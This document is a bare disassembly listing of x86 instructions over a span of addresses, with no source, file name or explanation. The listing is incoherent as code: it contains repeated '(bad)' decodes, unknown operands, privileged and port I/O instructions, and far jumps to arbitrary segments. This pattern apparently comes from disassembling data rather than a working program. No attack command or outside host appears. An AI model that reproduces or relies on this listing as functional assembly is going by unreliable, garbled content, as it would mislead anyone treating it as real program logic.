  4150c1:	ins    DWORD PTR es:[edi],dx
  4150c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150c3:	cmp    BYTE PTR [eax],ah
  4150c5:	mov    ebp,?
  4150c7:	es into 
  4150c9:	dec    eax
  4150ca:	enter  0x53f7,0xa3
  4150ce:	(bad)  
  4150cf:	idiv   DWORD PTR [ebx+0x2f1dc44c]
  4150d5:	arpl   WORD PTR [eax],ax
  4150d7:	push   es
  4150d8:	xor    BYTE PTR [ebp-0x549a6100],al
  4150de:	and    DWORD PTR [edx+0x7bbab1a6],0x57
  4150e5:	gs addr16 inc eax
  4150e8:	mov    bh,0xa4
  4150ea:	jmp    0x9635:0xebb73c86
  4150f1:	push   ds
  4150f2:	and    DWORD PTR [edx-0x66863e07],0xffffffb7
  4150f9:	sbb    al,0xef
  4150fb:	sar    BYTE PTR [eax],0x30
  4150fe:	hlt    
  4150ff:	and    BYTE PTR [edi-0x68],bl
  415102:	ins    DWORD PTR es:[edi],dx
  415103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415104:	mov    ds:0x25556ca0,eax
  415109:	fs pop ebp
  41510b:	clc    
  41510c:	cwde   
  41510d:	cmp    ch,BYTE PTR [esi-0x4e]
  415110:	retf   
  415111:	or     ebx,DWORD PTR ds:0xd3cef27
  415117:	add    al,0xf2
  415119:	xchg   DWORD PTR [eax-0x72],edi
  41511c:	or     al,bl
  41511e:	cli    
  41511f:	popf   
  415120:	aad    0xb
  415122:	mov    cl,0xce
  415124:	pop    eax
  415125:	sbb    DWORD PTR [ecx-0x5c1b10d4],0xf3ef59fe
  41512f:	sar    BYTE PTR [ebx+0x8],cl
  415132:	mov    ds:0xf034ce8c,eax
  415137:	icebp  
  415138:	in     eax,0xe0
  41513a:	sahf   
  41513b:	mov    ecx,ecx
  41513d:	arpl   bx,sp
  41513f:	cmp    edi,edx
  415141:	jo     0x4150d7
  415143:	and    al,0x74
  415145:	aaa    
  415146:	pushf  
  415147:	test   BYTE PTR [ecx-0x47],ch
  41514a:	sub    esi,0xbba34ddf
  415150:	out    dx,al
  415151:	call   0x3bf:0x75aeaa90
  415158:	(bad)  
  415159:	mov    edx,0x786061cf
  41515e:	cmp    BYTE PTR [eax-0x51],ah
  415161:	mov    ?,edx
  415163:	push   eax
  415164:	aam    0x62
  415166:	dec    edi
  415167:	sub    DWORD PTR [esi+0x32],0xa3187698
  41516e:	and    cl,bl
  415170:	dec    ebx
  415171:	or     eax,0x92d9e237
  415176:	sbb    al,0xd3
  415178:	mov    cl,0x60
  41517a:	pop    ss
  41517b:	ss jmp 0x4151ea
  41517e:	out    dx,eax
  41517f:	xchg   esi,eax
  415180:	pop    esp
  415181:	out    0xec,eax
  415183:	xchg   esi,eax
  415184:	push   0x4d
  415186:	je     0x41510c
  415188:	sub    al,0x42
  41518a:	mov    ds:0x97876717,al
  41518f:	cmp    edx,DWORD PTR [ebx]
  415191:	outs   dx,BYTE PTR ds:[esi]
  415192:	xor    al,0xc7
  415194:	daa    
  415195:	sub    BYTE PTR [eax-0x601ad8b9],dh
  41519b:	ins    BYTE PTR es:[edi],dx
  41519c:	push   edx
  41519d:	jno    0x4151d4
  41519f:	stc    
  4151a0:	clc    
  4151a1:	xor    DWORD PTR [esi],ebp
  4151a3:	rol    BYTE PTR [ebp-0x75],cl
  4151a6:	and    al,0xe0
  4151a8:	add    BYTE PTR [edi+ebx*8+0x13],dh
  4151ac:	test   DWORD PTR [edx+0x4d],esi
  4151af:	lods   al,BYTE PTR ds:[esi]
  4151b0:	sub    al,0x7
  4151b2:	inc    edx
  4151b3:	sub    DWORD PTR [ebx+esi*8-0x15621ac5],ecx
  4151ba:	hlt    
  4151bb:	mov    eax,ds:0xee9eec85
  4151c0:	loop   0x41522f
  4151c2:	push   0xffffffa6
  4151c4:	adc    cl,BYTE PTR [esi+eax*4-0x7a]
  4151c8:	sahf   
  4151c9:	or     eax,0xc2637e94
  4151ce:	xor    BYTE PTR [edi+0x619c6fad],cl
  4151d4:	dec    esp
  4151d5:	pop    esp
  4151d6:	inc    eax
  4151d7:	and    ebx,DWORD PTR [edx]
  4151d9:	push   ecx
  4151da:	and    BYTE PTR [edx+0x5c],ch
  4151dd:	mov    eax,ds:0x7fdc3c1a
  4151e2:	mov    edx,0xfffcf8a9
  4151e7:	pop    ebp
  4151e8:	aaa    
  4151e9:	jmp    0x41518d
  4151eb:	add    al,0x89
  4151ed:	push   edi
  4151ee:	repz (bad) 
  4151f1:	lock test al,0x9f
  4151f4:	das    
  4151f5:	push   ecx
  4151f6:	push   0xe2f9e5e4
  4151fb:	(bad)  
  4151fc:	fidivr DWORD PTR [ecx-0x4c25d425]
  415202:	out    dx,al
  415203:	(bad)  
  415204:	dec    esp
  415205:	and    al,0x88
  415207:	daa    
  415208:	mov    ds:0x2633d424,al
  41520d:	jle    0x4151e3
  41520f:	push   0x23
  415211:	jle    0x4151a8
  415213:	test   DWORD PTR [edx-0xe92fa20],edx
  415219:	shl    BYTE PTR [edx*8-0x1879578a],cl
  415220:	in     eax,0xa2
  415222:	(bad)  
  415223:	int    0xa5
  415225:	(bad)  
  415226:	fcomp  DWORD PTR [eax+0x17]
  415229:	rol    BYTE PTR [esi+0x2beff0e6],1
  41522f:	lds    ecx,FWORD PTR ds:0x5d93dc88
  415235:	loopne 0x4151e5
  415237:	mov    bl,0xff
  415239:	fcomi  st,st(5)
  41523b:	iret   
  41523c:	data16 into 
  41523e:	push   edx
  41523f:	test   al,0x91
  415241:	sbb    cl,BYTE PTR [edi]
  415243:	imul   edi,DWORD PTR [esi+eax*2],0x435e3183
  41524a:	push   cs
  41524b:	push   esi
  41524c:	rcr    cl,0xf8
  41524f:	mov    esp,0x6ebd0729
  415254:	std    
  415255:	(bad)  
  415257:	pop    es
  415258:	out    0xc1,al
  41525a:	jle    0x4151e0
  41525c:	sub    eax,0x8e9dd316
  415261:	pop    ebx
  415262:	fild   DWORD PTR [ecx-0x484619e6]
  415268:	loop   0x4151eb
  41526a:	lds    eax,FWORD PTR [edi-0x75]
  41526d:	jae    0x415231
  41526f:	call   0x9b27d901
  415274:	mov    ds:0x9b4e0751,eax
  415279:	ds mov ebx,0x9965ecea
  41527f:	mov    bh,0x96
  415281:	aad    0xbb
  415283:	sub    eax,DWORD PTR [edx]
  415285:	sub    eax,0xcbf0ba28
  41528a:	pop    ebx
  41528b:	mov    bl,0x4c
  41528d:	(bad)  
  41528f:	xlat   BYTE PTR ds:[ebx]
  415290:	adc    eax,0x1e2cf0dc
  415295:	or     eax,edx
  415297:	(bad)  
  415298:	(bad)  
  415299:	(bad)  
  41529a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41529b:	imul   ebx,DWORD PTR [edi-0x2dc893eb],0xffffffb6
  4152a2:	sbb    BYTE PTR [ebx+0x75246f02],dl
  4152a8:	mov    eax,ds:0xeb83920
  4152ad:	xor    ebx,edx
  4152af:	cwde   
  4152b0:	into   
  4152b1:	out    0x16,eax
  4152b3:	mov    eax,ds:0x801030ae
  4152b8:	and    eax,DWORD PTR [edi-0x41]
  4152bb:	mov    ch,0x62
  4152bd:	push   0xffffff8a
  4152bf:	jne    0x415299
  4152c1:	bound  eax,QWORD PTR [esi]
  4152c3:	clc    
  4152c4:	or     edx,edi
  4152c6:	into   
  4152c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152c8:	clc    
  4152c9:	pop    ds
  4152ca:	or     al,0xf8
  4152cc:	pushfw 
  4152ce:	pop    edi
  4152cf:	test   eax,0x2984149b
  4152d4:	outs   dx,DWORD PTR ds:[esi]
  4152d5:	inc    ebx
  4152d6:	xchg   ebx,eax
  4152d7:	ret    0x8f28
  4152da:	(bad)  
  4152db:	psrld  mm2,QWORD PTR [ecx-0x24]
  4152df:	sahf   
  4152e0:	cdq    
  4152e1:	lahf   
  4152e2:	test   al,0xc8
  4152e4:	sbb    DWORD PTR [edi+ecx*2],ebp
  4152e7:	lea    edi,[ebp-0x61]
  4152ea:	shl    BYTE PTR [edi+eax*1],0x83
  4152ee:	push   esi
  4152ef:	dec    ebp
  4152f0:	jg     0x41536e
  4152f2:	add    al,0xe0
  4152f4:	lahf   
  4152f5:	repz fisub DWORD PTR [edx+0x35]
  4152f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152fb:	adc    eax,0x8cc78fda
  415300:	inc    edi
  415301:	mov    eax,0x9c590544
  415306:	pop    ecx
  415307:	sbb    DWORD PTR [edi-0xb1d9937],esp
  41530d:	push   0x68
  41530f:	rcl    ebp,cl
  415311:	(bad)  
  415312:	sub    ebp,DWORD PTR [ebx-0x79]
  415315:	mov    edi,eax
  415317:	xchg   edx,eax
  415318:	sbb    DWORD PTR [eax+0x44ccf943],ebx
  41531e:	mov    edi,0x51cfc060
  415323:	cmp    BYTE PTR [esi+0xf54306f],bl
  415329:	pop    edi
  41532a:	ins    DWORD PTR es:[edi],dx
  41532b:	ja     0x41532e
  41532d:	jbe    0x4152af
  41532f:	dec    edi
  415330:	dec    ebx
  415331:	aad    0x58
  415333:	mov    cl,0x7c
  415335:	rcr    eax,1
  415337:	popf   
  415338:	pop    ebx
  415339:	(bad)  
  41533a:	aad    0xca
  41533c:	test   DWORD PTR [edx-0x6c],esp
  41533f:	inc    eax
  415340:	dec    ebx
  415341:	loopne 0x4152c6
  415343:	fcomi  st,st(4)
  415345:	push   ds
  415346:	push   esi
  415347:	pop    ebp
  415348:	(bad)  
  415349:	out    dx,al
  41534a:	sub    eax,DWORD PTR [edi-0x79]
  41534d:	cmp    DWORD PTR [edi+0x17948e7e],ecx
  415353:	stos   DWORD PTR es:[edi],eax
  415354:	xchg   edx,eax
  415355:	sub    eax,0x9eccab8e
  41535a:	inc    ebx
  41535b:	xchg   ch,cl
  41535d:	pop    eax
  41535e:	pop    ebp
  41535f:	or     al,0x51
  415361:	mov    edx,0xc5328286
  415366:	adc    ebx,DWORD PTR [ebx]
  415368:	nop    DWORD PTR [eax-0x2d]
  41536c:	arpl   WORD PTR [edi-0x47],dx
  41536f:	push   edx
  415370:	push   ss
  415371:	sbb    eax,0xa2327e7
  415376:	mov    al,0xff
  415378:	popf   
  415379:	test   al,0xc7
  41537b:	jg     0x4153c4
  41537d:	test   BYTE PTR [edi],0xc5
  415380:	xor    ecx,ebp
  415382:	add    eax,0xfb382cd5
  415387:	push   ebp
  415388:	jle    0x415371
  41538a:	fistp  QWORD PTR ds:0x518ecb4f
  415390:	fdivp  st(6),st
  415392:	mov    edi,0xba3426d8
  415397:	clc    
  415398:	sub    DWORD PTR [esi+ebp*4],edi
  41539b:	jecxz  0x415336
  41539d:	aas    
  41539e:	in     eax,dx
  41539f:	xchg   edx,eax
  4153a0:	mov    esi,edi
  4153a2:	jle    0x415345
  4153a4:	std    
  4153a5:	es jge 0x415379
  4153a8:	xor    BYTE PTR [ecx-0x71f63a9d],cl
  4153ae:	sahf   
  4153af:	por    mm1,mm4
  4153b2:	adc    al,0xfe
  4153b4:	out    0x62,eax
  4153b6:	pop    eax
  4153b7:	jae    0x415425
  4153b9:	ficom  WORD PTR [edx-0x63]
  4153bc:	ss mov ebx,0xb6ac441
  4153c2:	das    
  4153c3:	mov    esi,0xff7de009
  4153c8:	pusha  
  4153c9:	rcr    BYTE PTR [edx+0x44],1
  4153cc:	sub    eax,edx
  4153ce:	and    DWORD PTR [edx+0x55],edx
  4153d1:	lahf   
  4153d2:	outs   dx,BYTE PTR ds:[esi]
  4153d3:	(bad)  
  4153d4:	ja     0x4153c9
  4153d6:	push   esp
  4153d7:	push   ebp
  4153d8:	jne    0x41541a
  4153da:	add    al,0x7e
  4153dc:	mov    bl,0xc0
  4153de:	(bad)  [ecx+0x68a5d42f]
  4153e4:	in     al,dx
  4153e5:	ficomp WORD PTR [eax+eiz*1+0x2f326b9e]
  4153ec:	or     esp,DWORD PTR [edi]
  4153ee:	neg    BYTE PTR [esi-0x247b2f57]
  4153f4:	push   ss
  4153f5:	mov    bl,0x3d
  4153f7:	pop    es
  4153f8:	test   al,0xd6
  4153fa:	ror    BYTE PTR [ebp+esi*2-0x3f01b9e0],1
  415401:	inc    esi
  415402:	or     eax,0x2477c561
  415407:	outs   dx,BYTE PTR ds:[esi]
  415408:	shr    DWORD PTR [esi+0x13],1
  41540b:	pop    ecx
  41540c:	icebp  
  41540d:	call   0xe20f:0xc655acbc
  415414:	out    dx,al
  415415:	leave  
  415416:	ja     0x4153ff
  415418:	pusha  
  415419:	jb     0x41540c
  41541b:	mov    bh,0x41
  41541d:	stos   BYTE PTR es:[edi],al
  41541e:	ret    0x6bd6
  415421:	sar    edx,cl
  415423:	xor    al,0x37
  415425:	sub    ch,BYTE PTR [edi+eax*8-0x3af56007]
  41542c:	(bad)  
  41542d:	into   
  41542e:	mov    eax,ds:0xa3876cff
  415433:	clc    
  415434:	or     ecx,ecx
  415436:	fidivr WORD PTR [esi+esi*1-0x67ce8276]
  41543d:	mov    ah,0xf1
  41543f:	dec    ecx
  415440:	je     0x4154b0
  415442:	push   ebx
  415443:	xor    esi,DWORD PTR [edx-0x7c]
  415446:	add    DWORD PTR [eax+0x4a],0x5c
  41544a:	out    dx,eax
  41544b:	imul   edx,DWORD PTR [esi-0x30],0xf9c4f8e
  415452:	shl    ebp,cl
  415454:	pop    esp
  415455:	xadd   DWORD PTR [esi-0x6],esi
  415459:	inc    ebp
  41545a:	leave  
  41545b:	retf   0xe45f
  41545e:	or     DWORD PTR [ebx],ecx
  415460:	dec    BYTE PTR [ecx-0x4e]
  415463:	pop    ss
  415464:	cmp    al,0x33
  415466:	cli    
  415467:	mov    ?,WORD PTR [ecx]
  415469:	sub    esi,ebp
  41546b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41546c:	rcr    DWORD PTR [ebx+0x63],1
  41546f:	inc    ebp
  415471:	pop    eax
  415472:	xor    eax,DWORD PTR [eax-0x37]
  415475:	xlat   BYTE PTR ds:[ebx]
  415476:	or     BYTE PTR [ecx],bh
  415478:	mov    edx,0x5082c3e
  41547d:	or     BYTE PTR [ebx+0x1a53101f],ch
  415483:	mov    ebx,0xe8d5822f
  415488:	mov    ch,BYTE PTR [ecx-0x7d5fc4fb]
  41548e:	ins    DWORD PTR es:[edi],dx
  41548f:	(bad)  
  415490:	clc    
  415491:	pop    ds
  415492:	lods   al,BYTE PTR ds:[esi]
  415493:	inc    edi
  415494:	xlat   BYTE PTR ds:[ebx]
  415495:	ins    BYTE PTR es:[edi],dx
  415496:	mov    dl,0xf2
  415498:	ret    0x3601
  41549b:	pop    edi
  41549c:	into   
  41549d:	add    eax,0x4ff99761
  4154a2:	add    al,0xe2
  4154a4:	sub    eax,0x4cec6f27
  4154a9:	or     al,0x70
  4154ab:	sahf   
  4154ac:	pop    ecx
  4154ad:	lods   eax,DWORD PTR ds:[esi]
  4154ae:	mov    eax,ds:0x85f513b1
  4154b3:	adc    eax,DWORD PTR [ecx-0x15]
  4154b6:	push   esi
  4154b7:	mov    ah,cl
  4154b9:	jmp    0x92c71c4e
  4154be:	dec    ebx
  4154bf:	or     eax,0xbf870d31
  4154c4:	imul   ebp,DWORD PTR [edx+0x4c],0x287e39e2
  4154cb:	jno    0x41544e
  4154cd:	aaa    
  4154ce:	js     0x415529
  4154d0:	fidiv  WORD PTR [esi]
  4154d2:	adc    DWORD PTR [esi+0x2c0155bd],0x17d3cea9
  4154dc:	sub    esi,DWORD PTR [ebx+0xc]
  4154df:	push   ds
  4154e0:	shl    DWORD PTR [eax-0x63],0x39
  4154e4:	sbb    al,dh
  4154e6:	mov    WORD PTR [esi],?
  4154e8:	mov    ah,0xb0
  4154ea:	push   edx
  4154eb:	sbb    DWORD PTR [esi-0x2e],0xfd974888
  4154f2:	inc    eax
  4154f3:	idiv   ebp
  4154f5:	jb     0x41553b
  4154f7:	int    0x83
  4154f9:	js     0x4154cc
  4154fb:	arpl   WORD PTR [edi+ebx*8],bp
  4154fe:	lock lahf 
  415500:	inc    edx
  415501:	jmp    0xe7b:0xcc19c44b
  415508:	push   eax
  415509:	sbb    ch,BYTE PTR [ebx+0x7d]
  41550c:	addr16 jno 0x41557c
  41550f:	adc    al,0x52
  415511:	cwde   
  415512:	pop    esp
  415513:	outs   dx,DWORD PTR ds:[esi]
  415514:	sbb    al,0xf0
  415516:	sbb    ah,BYTE PTR [ebp+0x28]
  415519:	int3   
  41551a:	test   eax,0x93bc5438
  41551f:	dec    esi
  415520:	lds    edi,FWORD PTR [edx+0x1d0bc29d]
  415526:	mov    cl,0x1a
  415528:	fcmovnbe st,st(7)
  41552a:	mov    eax,0x3849e81b
  41552f:	lods   al,BYTE PTR ds:[esi]
  415530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415531:	aaa    
  415532:	cli    
  415533:	push   esp
  415534:	stc    
  415535:	adc    eax,DWORD PTR [ebx+eax*8]
  415538:	sub    eax,0xba84a9e2
  41553d:	or     DWORD PTR [esp+edi*8+0x6357a628],esp
  415544:	or     eax,0xea516683
  415549:	mov    ecx,0xe71f8b4d
  41554e:	and    esi,DWORD PTR [eax-0x237fa1ad]
  415554:	cmp    DWORD PTR [ebp+0x79],eax
  415557:	mov    eax,ds:0x4a123429
  41555c:	push   ebx
  41555d:	push   es
  41555e:	xor    DWORD PTR [esp+eiz*2+0x63],0x72bcdfd1
  415566:	adc    DWORD PTR [eax+0x1aa17da0],esi
  41556c:	cmp    dh,BYTE PTR [ecx]
  41556e:	outs   dx,BYTE PTR ds:[esi]
  41556f:	mov    edx,0x1cee8b7d
  415574:	jg     0x4155a9
  415576:	aaa    
  415577:	sti    
  415578:	sub    DWORD PTR [ecx+0x28],esp
  41557b:	out    dx,eax
  41557c:	jg     0x4155d7
  41557e:	push   es
  41557f:	leave  
  415580:	push   ebp
  415581:	cmp    BYTE PTR [ecx],dh
  415583:	in     al,0x37
  415585:	adc    eax,0x5672df29
  41558a:	fcom   st(0)
  41558c:	inc    esi
  41558d:	ret    0xd45a
  415590:	cld    
  415591:	and    al,0xc8
  415593:	push   esp
  415594:	cmp    DWORD PTR [ecx-0x6b],esi
  415597:	loope  0x41556b
  415599:	add    eax,0xb56f658a
  41559e:	mov    ecx,esp
  4155a0:	inc    esp
  4155a1:	mov    esp,0x806d2ff7
  4155a6:	out    0x53,eax
  4155a8:	aad    0xf2
  4155aa:	inc    ebp
  4155ab:	jns    0x415581
  4155ad:	sbb    esi,edi
  4155af:	pushf  
  4155b0:	jns    0x4155ea
  4155b2:	push   0xffffffed
  4155b4:	add    ah,ch
  4155b6:	loopne 0x41555e
  4155b8:	xor    bh,BYTE PTR [ebx]
  4155ba:	mov    dl,0xb9
  4155bc:	fs pop esi
  4155be:	aad    0x75
  4155c0:	in     al,0x9c
  4155c2:	out    dx,eax
  4155c3:	mov    ah,0xb6
  4155c5:	int3   
  4155c6:	mov    ah,0x62
  4155c8:	add    DWORD PTR [edi],ecx
  4155ca:	jns    0x41558b
  4155cc:	pop    edx
  4155cd:	arpl   ax,di
  4155cf:	stos   DWORD PTR es:[edi],eax
  4155d0:	outs   dx,DWORD PTR ds:[esi]
  4155d1:	lods   al,BYTE PTR ds:[esi]
  4155d2:	xchg   ebx,eax
  4155d3:	xchg   esp,eax
  4155d4:	inc    esi
  4155d5:	pop    ss
  4155d6:	mov    edi,DWORD PTR [ebx+ecx*8+0x7418e470]
  4155dd:	pop    es
  4155de:	push   edx
  4155df:	push   cs
  4155e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155e1:	jmp    0x7028:0x2f49f8c1
  4155e8:	std    
  4155e9:	pop    edx
  4155ea:	xor    DWORD PTR [edi-0x15d07e40],ebp
  4155f0:	dec    ebx
  4155f1:	sbb    al,0x3b
  4155f3:	(bad)  
  4155f4:	hlt    
  4155f5:	add    ecx,DWORD PTR [esi-0x7a]
  4155f8:	retf   0x46ed
  4155fb:	adc    dh,BYTE PTR [edx]
  4155fd:	gs cli 
  4155ff:	data16 sti 
  415601:	sahf   
  415602:	daa    
  415603:	fwait
  415604:	ror    BYTE PTR [eax-0x946e1a2],0x6b
  41560b:	in     al,dx
  41560c:	retf   0x9d06
  41560f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415610:	adc    esp,DWORD PTR [eax-0x5e]
  415613:	pusha  
  415614:	stos   BYTE PTR es:[edi],al
  415615:	jp     0x4155b7
  415617:	mov    bl,0x8
  415619:	mov    bl,0x2
  41561b:	shr    BYTE PTR [ebx],1
  41561d:	fisttp DWORD PTR [edi+0x9556f0a]
  415623:	fstp   QWORD PTR [edx]
  415625:	pop    ebx
  415626:	and    ch,cl
  415628:	out    0x23,eax
  41562a:	cmc    
  41562b:	nop
  41562c:	mov    cl,0x1
  41562e:	mov    esi,0x4925b8ac
  415633:	mov    esi,0xc60660b5
  415638:	retf   
  415639:	jbe    0x415667
  41563b:	inc    ebx
  41563c:	push   esp
  41563d:	push   edx
  41563e:	mov    al,bl
  415640:	dec    edi
  415641:	jge    0x4155d0
  415643:	mov    bl,0x9f
  415645:	mov    cl,0xdb
  415647:	push   esi
  415648:	push   eax
  415649:	fld    QWORD PTR [edi-0x4]
  41564c:	xor    dl,dl
  41564e:	push   ebp
  41564f:	hlt    
  415650:	jne    0x4155e8
  415652:	mov    ds:0x6384a7af,eax
  415657:	(bad)  
  415659:	arpl   WORD PTR [edx],dx
  41565b:	inc    DWORD PTR [ebp+0x39]
  41565e:	test   al,0x82
  415660:	jb     0x4156c4
  415662:	sub    eax,0x4e2924ea
  415667:	clc    
  415668:	or     BYTE PTR [ecx],bl
  41566a:	loope  0x4156ea
  41566c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41566d:	jge    0x41561c
  41566f:	cmp    edx,ecx
  415671:	add    eax,0x34aa6d65
  415676:	cwde   
  415677:	dec    edi
  415678:	sti    
  415679:	or     ecx,0xffffffd1
  41567c:	aas    
  41567d:	jmp    0x4156a4
  41567f:	loop   0x41565f
  415681:	sub    al,0x68
  415683:	push   ecx
  415684:	push   eax
  415685:	(bad)  
  415687:	fimul  DWORD PTR [edi-0x8]
  41568a:	add    ch,BYTE PTR [esi-0x5b698912]
  415690:	and    BYTE PTR [ebp-0x1e],0x52
  415694:	jle    0x415657
  415696:	jae    0x4156cd
  415698:	jae    0x41564a
  41569a:	fwait
  41569b:	outs   dx,DWORD PTR ds:[esi]
  41569c:	jb     0x415715
  41569e:	fs sub al,0x21
  4156a1:	add    esi,0x24cc4676
  4156a7:	outs   dx,BYTE PTR ds:[si]
  4156a9:	iret   
  4156aa:	pop    ecx
  4156ab:	inc    ecx
  4156ac:	aaa    
  4156ad:	loop   0x4156c5
  4156af:	fstp   TBYTE PTR [ebx-0x4bebdf30]
  4156b5:	nop
  4156b6:	push   ds
  4156b7:	xor    ebx,ebx
  4156b9:	pop    edi
  4156ba:	mov    bh,0x14
  4156bc:	sub    BYTE PTR [ebx-0x26],bl
  4156bf:	push   ebp
  4156c0:	fs mov ebx,0xfe77dac
  4156c6:	bound  eax,QWORD PTR [ebx]
  4156c8:	out    0x7f,al
  4156ca:	aas    
  4156cb:	and    BYTE PTR [eax+0x38],bh
  4156ce:	xchg   ebx,eax
  4156cf:	gs test al,0x78
  4156d2:	(bad)  
  4156d3:	outs   dx,BYTE PTR ds:[esi]
  4156d4:	inc    eax
  4156d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156d6:	xor    ebx,DWORD PTR [eax+eiz*8+0x2adcb7ce]
  4156dd:	(bad)  
  4156de:	lea    ecx,[ebp-0x75a82b56]
  4156e4:	pop    es
  4156e5:	mov    edi,DWORD PTR [edi-0x2696279a]
  4156eb:	jmp    0x4156c9
  4156ed:	adc    eax,0x1463fc9c
  4156f2:	popf   
  4156f3:	ss loopne 0x41571c
  4156f6:	test   DWORD PTR [edi],ebp
  4156f8:	sbb    al,0x45
  4156fa:	dec    eax
  4156fb:	or     cl,BYTE PTR [edx-0x52]
  4156fe:	and    ebx,edi
  415700:	outs   dx,DWORD PTR ds:[esi]
  415701:	gs sub ebx,esp
  415704:	xchg   edi,eax
  415705:	adc    ebx,DWORD PTR [esi-0x532b279b]
  41570b:	mov    al,ds:0x2ec4df42
  415710:	scas   al,BYTE PTR es:[edi]
  415711:	jno    0x415776
  415713:	test   eax,0x7f9129ff
  415718:	inc    esi
  415719:	and    edx,esp
  41571b:	nop
  41571c:	out    dx,al
  41571d:	leave  
  41571e:	dec    edx
  41571f:	adc    ecx,DWORD PTR [esi-0xd029303]
  415725:	sub    BYTE PTR [ebp+0x7c],dl
  415728:	(bad)  
  415729:	mov    esp,0xc6fd6f7a
  41572e:	dec    eax
  41572f:	pop    ebx
  415730:	imul   esi,DWORD PTR [ebp-0x66aef8fe],0x16
  415737:	fsub   DWORD PTR [esi]
  415739:	sahf   
  41573a:	in     eax,dx
  41573b:	push   eax
  41573c:	inc    eax
  41573d:	inc    ecx
  41573e:	push   eax
  41573f:	pop    esp
  415740:	js     0x415763
  415742:	push   ss
  415743:	xor    ah,ah
  415745:	fidivr DWORD PTR [ecx]
  415747:	mov    cl,0xb7
  415749:	popa   
  41574a:	or     BYTE PTR [edx],0xd7
  41574d:	dec    ecx
  41574e:	mov    ch,bh
  415750:	or     dh,BYTE PTR [edi+0x7d]
  415753:	or     BYTE PTR [ecx+0x3a359c2e],al
  415759:	mov    esp,0xc5c81da4
  41575e:	pop    esi
  41575f:	and    BYTE PTR [ecx+ebp*1],ch
  415762:	xchg   ecx,eax
  415763:	add    al,0xa4
  415765:	dec    esi
  415766:	in     al,0x85
  415768:	push   ebx
  415769:	lock loope 0x415794
  41576c:	or     eax,0x9201adf5
  415771:	push   0x4a77f66b
  415776:	cmp    eax,DWORD PTR [ebp+0x68]
  415779:	pop    eax
  41577a:	push   ds
  41577b:	xchg   BYTE PTR [ebx+0x1c],al
  41577e:	sbb    edx,DWORD PTR [ebx+edi*2-0x4f5cb7a7]
  415785:	ja     0x415716
  415787:	mov    esp,0x231e87d1
  41578c:	mov    edi,0x3ce5c0e6
  415791:	sbb    ecx,DWORD PTR [eax+0x56]
  415794:	leave  
  415795:	ja     0x41578c
  415797:	inc    eax
  415798:	pop    edi
  415799:	addr16 sub eax,0xc4f73916
  41579f:	dec    eax
  4157a0:	sbb    eax,0x858ffdf6
  4157a5:	outs   dx,DWORD PTR ds:[esi]
  4157a6:	or     esi,DWORD PTR [ebx+0x68bc252d]
  4157ac:	mov    cl,0x80
  4157ae:	xchg   ebx,eax
  4157af:	xchg   ebp,eax
  4157b0:	in     al,0x70
  4157b2:	mov    edi,0xaa59521f
  4157b7:	pop    ebx
  4157b8:	sub    al,0x12
  4157ba:	gs mov esp,0x330297e5
  4157c0:	jae    0x4157f0
  4157c2:	lock xchg ebp,eax
  4157c4:	dec    esi
  4157c5:	(bad)
  4157c8:	mov    cl,0x1e
  4157ca:	push   edx
  4157cb:	mov    BYTE PTR [edx+0x6a2326e3],0xec
  4157d2:	mov    cl,0xe1
  4157d4:	data16 out dx,al
  4157d6:	ja     0x4157d0
  4157d8:	fisttp WORD PTR ds:0x52e7d503
  4157de:	adc    ch,al
  4157e0:	adc    ebx,eax
  4157e2:	jl     0x41578b
  4157e4:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157e6:	and    ebp,esi
  4157e8:	and    DWORD PTR [ecx],ebp
  4157ea:	shl    DWORD PTR [edi+0x5c],cl
  4157ed:	aam    0x5c
  4157ef:	mov    esp,0x2db5f5e9
  4157f4:	xor    esp,DWORD PTR [esi-0x3]
  4157f7:	dec    esi
  4157f8:	(bad)  
  4157f9:	mov    ah,0xe0
  4157fb:	sahf   
  4157fc:	pop    edi
  4157fd:	sbb    eax,ecx
  4157ff:	inc    ebx
  415800:	jecxz  0x415798
  415802:	ror    edi,cl
  415804:	aad    0xaa
  415806:	enter  0x7336,0xde
  41580a:	pop    esp
  41580b:	test   BYTE PTR [edx+0x6a10b016],0xcd
  415812:	jns    0x4157e0
  415814:	inc    esp
  415815:	dec    edx
  415816:	mov    eax,ds:0xf80e14b0
  41581b:	lds    edx,FWORD PTR cs:[esi-0x5346f7da]
  415822:	daa    
  415823:	xchg   esi,eax
  415824:	mov    ecx,DWORD PTR [edx]
  415826:	mov    dl,0x17
  415828:	push   ebx
  415829:	xor    eax,0x563ed6e8
  41582e:	call   0x42d7:0x18fa2f55
  415835:	inc    edx
  415836:	jg     0x415822
  415838:	not    BYTE PTR [eax-0xd]
  41583b:	sbb    esi,DWORD PTR [ecx-0x51484b2c]
  415841:	iret   
  415842:	loope  0x415884
  415844:	aam    0x9a
  415846:	test   eax,0x69d01b5f
  41584b:	xor    eax,0x7bf84319
  415850:	pop    ebp
  415851:	fmul   QWORD PTR [ebx+0x23093209]
  415857:	clc    
  415858:	retf   
  415859:	push   esi
  41585a:	mov    ds:0x21c0b581,eax
  41585f:	sbb    edi,eax
  415861:	outs   dx,BYTE PTR ds:[esi]
  415862:	push   eax
  415863:	shr    BYTE PTR [ebp-0x27],0xb9
  415867:	pop    eax
  415868:	sub    eax,0xe818d405
  41586d:	push   esp
  41586e:	(bad)  
  41586f:	or     al,0x9c
  415871:	dec    edx
  415872:	fmul   DWORD PTR [edi+esi*1+0x2c]
  415876:	inc    ebp
  415877:	sbb    edx,esi
  415879:	mov    eax,ds:0x2d3c93f5
  41587e:	leave  
  41587f:	or     al,0x6b
  415881:	ins    DWORD PTR es:[edi],dx
  415882:	push   0x2a67ca9b
  415887:	lahf   
  415888:	jb     0x415832
  41588a:	xor    ebp,eax
  41588c:	and    BYTE PTR ds:0xa9ddb4a3,bh
  415892:	lahf   
